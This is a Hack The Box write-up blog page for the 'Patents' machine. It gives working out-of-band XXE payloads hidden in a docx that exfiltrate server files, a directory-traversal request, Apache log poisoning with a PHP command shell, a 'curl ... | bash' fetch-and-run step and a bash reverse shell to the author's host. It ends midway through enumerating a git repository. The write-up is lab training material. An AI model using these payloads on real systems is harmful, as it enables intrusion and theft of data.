@@ -1,0 +1,1203 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Hack The Box - Patents Writeup | Chr0x6eOs</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Hack The Box - Patents Writeup" />
+<meta name="author" content="Chr0x6eOs" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Overview" />
+<meta property="og:description" content="Overview" />
+<link rel="canonical" href="http://localhost:4000/2020/05/16/htb-Patents.html" />
+<meta property="og:url" content="http://localhost:4000/2020/05/16/htb-Patents.html" />
+<meta property="og:site_name" content="Chr0x6eOs" />
+<meta property="og:image" content="http://localhost:4000/assets/htb/Patents/logo.png" />
+<meta property="og:image:height" content="300" />
+<meta property="og:image:width" content="300" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-16T00:00:00+02:00" />
+<script type="application/ld+json">
+{"image":{"width":300,"height":300,"url":"http://localhost:4000/assets/htb/Patents/logo.png","@type":"imageObject"},"@type":"BlogPosting","url":"http://localhost:4000/2020/05/16/htb-Patents.html","dateModified":"2020-05-16T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/05/16/htb-Patents.html"},"author":{"@type":"Person","name":"Chr0x6eOs"},"headline":"Hack The Box - Patents Writeup","description":"Overview","datePublished":"2020-05-16T00:00:00+02:00","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Chr0x6eOs" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Chr0x6eOs</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Patents Writeup</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2020-05-16T00:00:00+02:00" itemprop="datePublished">May 16, 2020
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">Chr0x6eOs</span></span></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h1 id="overview">Overview</h1>
+<p><img src="/assets/htb/Patents/patents.png" alt="Patents Image" /></p>
+
+<p><a href="https://www.hackthebox.eu/home/machines/profile/224">Patents</a> is a hard linux box by <a href="https://www.hackthebox.eu/home/users/profile/36994">gbyolo</a>.</p>
+
+<p>The box starts with web-enumeration, which reveals a that webpage allows docx file upload and parses the document on server-side. This allows out-of-band XXE to leak arbitrary files. After leaking a config file from the server, we find a webpage that is vulnerable to directory-traversal. Using the directory-traversal we can use apache log poisoning to get a shell in the context of www-data. Enumerating the system, we find that we are in a docker environment. After running pspy, we get the password for the root user of the container and can read user.txt.</p>
+
+<p>For root, we find a git repository, which contains source code and a binary for a server. We find that this server is running on port 8888. After reversing the binary, we find that the url-decode function is vulnerable to an overflow. Exploiting the overflow in url-decode we can leak the libc-base and use a simple rop-chain to get a shell as root. After getting root, we have to enumerate the system to find an unmounted disk. After mounting the disk, we get root.txt.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<h2 id="nmap">Nmap</h2>
+<p>Starting of with a nmap to check for open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.10.173
+Nmap scan report <span class="k">for </span>10.10.10.173
+Host is up <span class="o">(</span>0.044s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 39:b6:84:a7:a7:f3:c2:4f:38:db:fc:2a:dd:26:4e:67 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b1:cd:18:c7:1d:df:57:c1:d2:61:31:89:9e:11:f5:65 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 73:37:88:6a:2e:b8:01:4e:65:f7:f8:5e:47:f6:10:c4 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http            Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: MEOW Inc. - Patents Management
+8888/tcp open  sun-answerbook?
+| fingerprint-strings:
+|   Help, LPDString, LSCP:
+|_    LFM 400 BAD REQUEST
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8888-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/13%Time<span class="o">=</span>5EBC2A3B%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>LS
+SF:CP,17,<span class="s2">"LFM</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20BAD</span><span class="se">\x</span><span class="s2">20REQUEST</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Help,17,<span class="s2">"LFM</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20
+SF:BAD</span><span class="se">\x</span><span class="s2">20REQUEST</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>LPDString,17,<span class="s2">"LFM</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20BAD</span><span class="se">\x</span><span class="s2">20REQUEST</span><span class="se">\r</span><span class="s2">
+SF:</span><span class="se">\n\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h1 id="enumeration">Enumeration</h1>
+<p>The open ports shown are <strong>22</strong>, <strong>80</strong> and <strong>8888</strong>. HTTP is usally the most interesting, so let us check it out first.</p>
+
+<h2 id="http---port-80">HTTP - Port 80</h2>
+<p>Going to http://10.10.10.173, we get this webpage.</p>
+
+<p><img src="/assets/htb/Patents/webpage-index.png" alt="Index page" /></p>
+
+<p>Upload patent seems like an interesting endpoint, so let us check this one out.</p>
+
+<p><img src="/assets/htb/Patents/webpage-upload.png" alt="Upload patent" /></p>
+
+<p>The upload page seems quite interesting. It states, that the uploaded docx document will be converted into a pdf. Server-side file-parsing can be dangerous! After a bit of research, I found a <a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf">great document</a> showcasing an XXE vulnerability with file-parsing.</p>
+
+<h3 id="verifying-xxe">Verifying XXE</h3>
+<p>In order for us to verify the XXE, we first create a docx document with a malicious xml file.
+We can download a sample docx document from <a href="https://file-examples.com/index.php/sample-documents-download/sample-doc-download/">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~/extracted# unzip ../sample.docx
+Archive:  ../sample.docx
+  inflating: <span class="o">[</span>Content_Types].xml
+  inflating: _rels/.rels
+  inflating: word/document.xml
+  inflating: word/_rels/document.xml.rels
+  inflating: word/theme/theme1.xml
+  inflating: word/settings.xml
+  inflating: word/styles.xml
+  inflating: word/webSettings.xml
+  inflating: word/fontTable.xml
+  inflating: docProps/core.xml
+  inflating: docProps/app.xml
+root@silence:~/extracted# <span class="nb">mkdir </span>customXml
+</code></pre></div></div>
+<p>We extract the docx document and add a customXml folder.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~/extracted/customXml# <span class="nb">cat </span>item1.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> ?&gt;
+&lt;<span class="o">!</span>DOCTYPE xxe <span class="o">[</span>
+&lt;<span class="o">!</span>ENTITY % ext SYSTEM <span class="s2">"http://10.10.14.5/ext.dtd"</span><span class="o">&gt;</span>
+  %ext<span class="p">;</span>
+<span class="o">]&gt;</span>
+&lt;xxe&gt;&lt;/xxe&gt;
+</code></pre></div></div>
+<p>We can now create a malicious xml file, which if the target is vulnerable, should connect to our machine, requesting the ext.dtd file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~/extracted# zip <span class="nt">-r</span> ../xxe-test.docx <span class="k">*</span>
+  adding: <span class="o">[</span>Content_Types].xml <span class="o">(</span>deflated 74%<span class="o">)</span>
+  adding: customXml/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: customXml/item1.xml <span class="o">(</span>deflated 8%<span class="o">)</span>
+  adding: docProps/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: docProps/core.xml <span class="o">(</span>deflated 52%<span class="o">)</span>
+  adding: docProps/app.xml <span class="o">(</span>deflated 50%<span class="o">)</span>
+  adding: _rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: _rels/.rels <span class="o">(</span>deflated 61%<span class="o">)</span>
+  adding: word/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: word/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: word/_rels/document.xml.rels <span class="o">(</span>deflated 71%<span class="o">)</span>
+  adding: word/styles.xml <span class="o">(</span>deflated 90%<span class="o">)</span>
+  adding: word/webSettings.xml <span class="o">(</span>deflated 56%<span class="o">)</span>
+  adding: word/settings.xml <span class="o">(</span>deflated 64%<span class="o">)</span>
+  adding: word/fontTable.xml <span class="o">(</span>deflated 69%<span class="o">)</span>
+  adding: word/document.xml <span class="o">(</span>deflated 73%<span class="o">)</span>
+  adding: word/theme/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: word/theme/theme1.xml <span class="o">(</span>deflated 80%<span class="o">)</span>
+</code></pre></div></div>
+<p>We now put the whole file back together and upload it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.173 - - <span class="o">[</span>13/May/2020 19:40:54] code 404, message File not found
+10.10.10.173 - - <span class="o">[</span>13/May/2020 19:40:54] <span class="s2">"GET /ext.dtd HTTP/1.0"</span> 404 -
+</code></pre></div></div>
+<p>After uploading we get a response back from the server. With this we have successfully verified XXE and can start exploiting.</p>
+
+<h1 id="initial-foothold">Initial foothold</h1>
+<p>With the XXE verified, we can exploit the XXE to read arbitrary files from the system.</p>
+
+<h2 id="exploiting-oob-xxe">Exploiting OOB-XXE</h2>
+<p>After researching a bit more, I found an <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">article</a> that explains out-of-band XXE data exfiltration. It seems like we exploit the external DTD to exfiltrate files from the server. As we may want to read php files, we also use PHP-filters. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection#xxe-oob-with-dtd-and-php-filter">PayloadAllTheThings</a> has a good payload we can use for that.</p>
+
+<h3 id="verifying-file-read">Verifying file-read</h3>
+<p>In order to get file-read we have to modify our current payload, to load the DTD from our server, which then leaks files from the server.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~/extracted/customXml# <span class="nb">cat </span>item1.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> ?&gt;
+&lt;<span class="o">!</span>DOCTYPE xxe <span class="o">[</span>
+&lt;<span class="o">!</span>ENTITY % ext SYSTEM <span class="s2">"http://10.10.14.5/ext.dtd"</span><span class="o">&gt;</span>
+  %ext<span class="p">;</span>
+  %file<span class="p">;</span>
+<span class="o">]&gt;</span>
+&lt;xxe&gt;&amp;exfil<span class="p">;</span>&lt;/xxe&gt;
+</code></pre></div></div>
+<p>The XXE now gets the ext.dtd file, which contains the contains the file entity, which again contains the exfil entity. We now update the docx file and upload it again.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# <span class="nb">cat </span>ext.dtd
+&lt;<span class="o">!</span>ENTITY % data SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/etc/passwd"</span><span class="o">&gt;</span>
+&lt;<span class="o">!</span>ENTITY % file <span class="s2">"&lt;!ENTITY exfil SYSTEM 'http://10.10.14.5/DATA?%data;'&gt;"</span><span class="o">&gt;</span>
+</code></pre></div></div>
+<p>The ext.dtd with the file code to exfiltrate /etc/passwd, by using the php-filter to base64 encode the file and then send the base64 data back to our server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.173 - - <span class="o">[</span>13/May/2020 19:58:17] <span class="s2">"GET /ext.dtd HTTP/1.0"</span> 200 -
+10.10.10.173 - - <span class="o">[</span>13/May/2020 19:58:17] code 404, message File not found
+10.10.10.173 - - <span class="o">[</span>13/May/2020 19:58:17] <span class="s2">"GET /DATA?cm9vdDp[...]L2Jhc2gK HTTP/1.0"</span> 404 -
+</code></pre></div></div>
+<p>Uploading the new docx document, we get base64 data returned as a response.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"cm9vd...Jhc2gK"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+gbyolo:x:1000:1000::/home/gbyolo:/bin/bash
+</code></pre></div></div>
+<p>Base64 decoding the data, we indeed get the /etc/passwd from the server as a response.</p>
+
+<h3 id="leaking-configphp">Leaking config.php</h3>
+<p>Now that we have file-read, let us use gobuster and try to find any interesting file we can leak using this vulnerability.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.173 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.173
+<span class="o">[</span>+] Threads:        10
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     php
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/05/13 20:01:07 Starting gobuster
+<span class="o">===============================================================</span>
+/index <span class="o">(</span>Status: 200<span class="o">)</span>
+/profile <span class="o">(</span>Status: 200<span class="o">)</span>
+/uploads <span class="o">(</span>Status: 301<span class="o">)</span>
+/static <span class="o">(</span>Status: 301<span class="o">)</span>
+/upload <span class="o">(</span>Status: 200<span class="o">)</span>
+/upload.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/release <span class="o">(</span>Status: 301<span class="o">)</span>
+/vendor <span class="o">(</span>Status: 301<span class="o">)</span>
+/config.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/patents <span class="o">(</span>Status: 301<span class="o">)</span>
+</code></pre></div></div>
+<p>Config.php seems interesting, so let try to leak the contents of this file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# <span class="nb">cat </span>ext.dtd
+&lt;<span class="o">!</span>ENTITY % data SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=config.php"</span><span class="o">&gt;</span>
+&lt;<span class="o">!</span>ENTITY % file <span class="s2">"&lt;!ENTITY exfil SYSTEM 'http://10.10.14.5/DATA?%data;'&gt;"</span><span class="o">&gt;</span>
+</code></pre></div></div>
+<p>In order to leak config.php, we simply have to change the file to read in the ext.dtd file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.173 - - <span class="o">[</span>13/May/2020 20:03:24] <span class="s2">"GET /DATA?PD9waH[...]Cj8+Cgo= HTTP/1.0"</span> 404 -
+
+root@silence:~# <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"PD9waH[...]Cj8+Cgo="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+&lt;?php
+<span class="c"># needed by convert.php</span>
+<span class="nv">$uploadir</span> <span class="o">=</span> <span class="s1">'letsgo/'</span><span class="p">;</span>
+
+<span class="c"># needed by getPatent.php</span>
+<span class="c"># gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it's vulnerable</span>
+define<span class="o">(</span><span class="s1">'PATENTS_DIR'</span>, <span class="s1">'/patents/'</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+<p>Base64 decoding the received data, we get find a new interesting file, we could try to access: getPatent_alphav1.0.php.</p>
+
+<h2 id="path-traversal-to-rce">Path-traversal to RCE</h2>
+<p>Going to getPatent_alphav1.0.php, we get a webpage, where we seem to be able to read patents by supplying the id parameter. Using the same technique as before, we can leak the source code of getPatent_alphav1.0.php in order to analyze it. Sadly, this does not work as expected for some reason. Supplying ids gives us different output, but nothing too interesting.</p>
+
+<p><img src="/assets/htb/Patents/webpage-getpatent.png" alt="Get patents" /></p>
+
+<p>After a bit of playing around, I was able to bypass the filter and got to read /etc/passwd.</p>
+
+<p><img src="/assets/htb/Patents/webpage-lfi.png" alt="LFI /etc/passwd" /></p>
+
+<p>In order for us to get code-execution, we can use log-poisoning of the apache2 access log. For this, we can change our user-agent to any php-code. This php-code will then be written into the access.log file, where it will be interpreted once we exploit the directory-traversal.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# curl <span class="s2">"http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//var/log/apache2/access.log"</span> <span class="nt">-H</span> <span class="s1">'User-Agent: &lt;?php system($_GET['</span>cmd<span class="s1">']); ?&gt;'</span>
+</code></pre></div></div>
+<p>Using curl, we can poison the apache2 log. Now the access.log file contains our user-agent, which allows us to execute arbitrary commands by supplying the cmd GET parameter.</p>
+
+<p><img src="/assets/htb/Patents/webpage-logpoison-rce.png" alt="RCE via log-poisoning" /></p>
+
+<p>We now have RCE on the server in the context of www-data. Let us get a shell next.</p>
+
+<p>In order to get a shell, we simply let the server download and execute a bash reverse-shell, that we will host on our machine.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# <span class="nb">cat </span>shell.sh
+<span class="c">#!/bin/bash</span>
+bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.5/443 0&gt;&amp;1'</span>
+</code></pre></div></div>
+<p>We can now trigger the reverse-shell by sending <code class="language-plaintext highlighter-rouge">curl 10.10.14.15/shell.sh|bash</code> as a cmd parameter.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//var/log/apache2/access.log&amp;cmd=curl+10.10.14.5/shell.sh|bash
+</span></code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.173 - - <span class="o">[</span>13/May/2020 20:28:12] <span class="s2">"GET /shell.sh HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+<p>We get a shell as www-data returned.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@silence:~# nc <span class="nt">-lnvp</span> 443
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.173.
+Ncat: Connection from 10.10.10.173:54904.
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>9<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@8d8f7bbd30e4:/var/www/html/docx2pdf<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="privesc-to-user">Privesc to user</h1>
+<p>Now that we have a shell on the system as www-data, let us upgrade our shell and enumerate the system as www-data.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@8d8f7bbd30e4:/var/www/html/docx2pdf<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+&lt;pdf<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+www-data@8d8f7bbd30e4:/var/www/html/docx2pdf<span class="nv">$ </span>^Z
+<span class="o">[</span>1]+  Stopped                 nc <span class="nt">-lnvp</span> 443
+root@silence:~/# <span class="nb">stty </span>raw <span class="nt">-echo</span>
+root@silence:~/# nc <span class="nt">-lnvp</span> 443
+www-data@8d8f7bbd30e4:/var/www/html/docx2pdf<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+</code></pre></div></div>
+<p>Now that we have a fully working shell, let us enumerate the system.</p>
+
+<h2 id="enumeration-as-www-data">Enumeration as www-data</h2>
+<p>Right off the bat, I noticed the strange looking hostname, which could suggest that we are in a docker container.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@8d8f7bbd30e4:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-alh</span>
+total 88K
+drwxr-xr-x   1 root root 4.0K May 13 18:23 <span class="nb">.</span>
+drwxr-xr-x   1 root root 4.0K May 13 18:23 ..
+<span class="nt">-rwxr-xr-x</span>   1 root root    0 May 13 18:23 .dockerenv
+</code></pre></div></div>
+<p>Checking the root directory, we indeed seem to be in a docker container. After some basic linux enumeration, which did not lead anywhere, I decided to upload <a href="https://github.com/DominicBreuker/pspy">pspy</a> to the box and check if there are any interesting processes running.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@8d8f7bbd30e4:/tmp<span class="nv">$ </span>./pspy
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                                                                                                                       
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
+                   ░           ░ ░
+                               ░ ░
+
+Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> | file-system-events<span class="o">=</span><span class="nb">false</span> <span class="o">||</span>| Scannning <span class="k">for </span>processes every 100ms and on inotify events <span class="o">||</span>| Watching directories: <span class="o">[</span>/usr /tmp /etc /home /var /opt] <span class="o">(</span>recursive<span class="o">)</span> | <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>
+Draining file system events due to startup...
+<span class="k">done
+</span>2020/05/13 18:37:37 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>9      | /bin/sh /usr/sbin/apachectl <span class="nt">-D</span> FOREGROUND
+<span class="o">[</span>...]
+2020/05/13 18:38:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>172    | /bin/sh <span class="nt">-c</span> <span class="nb">env </span><span class="nv">PASSWORD</span><span class="o">=</span><span class="s2">"!gby0l0r0ck</span><span class="se">\$\$</span><span class="s2">!"</span> /opt/checker_client/run_file.sh
+</code></pre></div></div>
+<p>Running pspy, we seem to have a password in the environment variable PASSWORD.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@8d8f7bbd30e4:/tmp<span class="nv">$ </span>su
+Password: <span class="o">!</span>gby0l0r0ck<span class="nv">$$</span><span class="o">!</span>
+root@8d8f7bbd30e4:/tmp#
+</code></pre></div></div>
+<p>Using the found password we can su to root of the docker container and read user.txt.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@8d8f7bbd30e4:/home/gbyolo# <span class="nb">cat </span>user.txt
+79375<span class="k">***************************</span>
+</code></pre></div></div>
+
+<h1 id="privesc-to-root">Privesc to root</h1>
+<p>Now that we are root of the docker container, we need to find a way to break out of the container.</p>
+
+<h2 id="enumeration-as-user">Enumeration as user</h2>
+<p>After a bit of enumeration, I tried to find any git repositories.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@8d8f7bbd30e4:/# find / <span class="nt">-name</span> .git 2&gt;/dev/null
+/usr/src/lfm/.git
+</code></pre></div></div>
+<p>And I indeed it seems like we have some interesting files.</p>
+
+<h3 id="enumeration-of-the-git-repo">Enumeration of the git repo</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@8d8f7bbd30e4:/usr/src/lfm/.git# git log <span class="nt">--diff-filter</span><span class="o">=</span>D <span class="nt">--summary</span>
+commit 7c6609240f414a2cb8af00f75fdc7cfbf04755f5 <span class="o">(</span>HEAD -&gt; master<span class="o">)</span>
+Author: gbyolo &lt;gbyolo.htb&gt;
+Date:   Mon May 20 17:04:37 2019 +0200
+
+    Removed meow files. THIS REPOSITORY IS ON SVN
+
+ delete mode 100644 README
+ delete mode 100755 lfmserver
+
+commit aa139d6caea2182c73341919150d9f5cd05e7468
+Author: gbyolo &lt;gbyolo@htb&gt;
+Date:   Mon Mar 11 09:39:39 2019 +0100
+
+    Switched to SVN <span class="k">for </span>repository hosting. This will be empty
+
+ delete mode 100644 Makefile
+ delete mode 100644 README
+ delete mode 100644 arg_parsing.c
+ delete mode 100644 arg_parsing.h
+ delete mode 100644 file.c
+ delete mode 100644 file.h
+ delete mode 100644 files/try
+ delete mode 100644 lfm.c
+ delete mode 100644 lfm.h
+ delete mode 100644 lfmserver.c
+ delete mode 100644 lfmserver.conf
+ delete mode 100644 lfmserver.h
+ delete mode 100644 log.c
+ delete mode 100644 log.h
+ delete mode 100644 md5.c
+ delete mode 100644 md5.h
+ delete mode 100644 params_parsing.c
+ delete mode 100644 params_parsing.h
